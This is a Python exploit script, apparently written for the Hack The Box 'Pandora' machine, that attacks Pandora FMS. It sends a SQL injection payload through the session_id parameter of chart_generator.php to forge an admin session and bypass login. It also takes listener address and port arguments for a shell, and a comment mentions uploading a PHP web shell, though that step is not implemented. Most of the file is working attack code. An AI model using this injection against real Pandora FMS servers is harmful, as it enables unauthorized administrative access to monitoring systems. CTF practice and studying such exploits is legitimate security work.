#! /usr/bin/env python3

## Author: 0xEtern4lW0lf
## Created: 18 Dez 2022
## Description: TEMPLATE

## ========= MODULES =========

import argparse
import sys
import time
import socket
import telnetlib
from threading import Thread

try:
    import requests
except:
    print(f"ERRORED: RUN: pip install requests")
    exit()
import sys
import time
import urllib.parse

## ========= VARIABLE =========

#### COLORS ####
RED = "\033[1;91m"
YELLOW = "\033[1;93m"
BLUE = "\033[1;94m"
GREEN = "\033[1;92m"
END = "\033[1;m "

## Set proxy [OPTIONAL]
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


webName = '0xEtern4lW0lf'
cookie = 'dat3q5otti0ib0cb5stra5k32c'


## ========= FUNCTION =========


## Weaponization and Attack

def bypassLogin(rhost,rport):
    
    print("[+] Bypass login session [+]")

    global payload
    payload = "a' UNION SELECT 'a',1,'id_usuario|s:5:\"admin\";' as data FROM tsessions_php WHERE '1'='1"

    url = f"http://{rhost}:{rport}/pandora_console/include/chart_generator.php?session_id={payload}"

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '1',
        }

    cookies = {'PHPSESSID': cookie}

    # Try to upload the PHP web shell to the server

    r = requests.get(url, headers=headers, cookies=cookies, proxies=proxies)




def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser = argparse.ArgumentParser(description='GetShell - Pandora / HTB - 0xEtern4lW0lf')
    parser.add_argument('-t', '--target', help='Target IP address or hostname', type=str, required=True)
    parser.add_argument('-p','--rport', help="Port of the target machine.", type=int, required=True)
    parser.add_argument('-li', '--lhost', help='Local IP address or hostname', type=str, required=True)
    parser.add_argument('-lp', '--lport', help='Local Port to receive the shell', type=int, required=True)

    args = parser.parse_args()

    rhost = args.target
    rport = args.rport
    lhost = args.lhost
    lport = args.lport


    print('BYPASSLOGIN')

    bypassLogin(rhost,rport)


    # Print some information
    print("\n[+] Setting information")
    print("[+] lhost: ", lhost)
    print("[+] lport: ", lport)
    print("[+] rhost: ", rhost)
    print("[+] rport: ", rport)
    print("[+] payload: ", payload)


    
if __name__ == '__main__':
    main()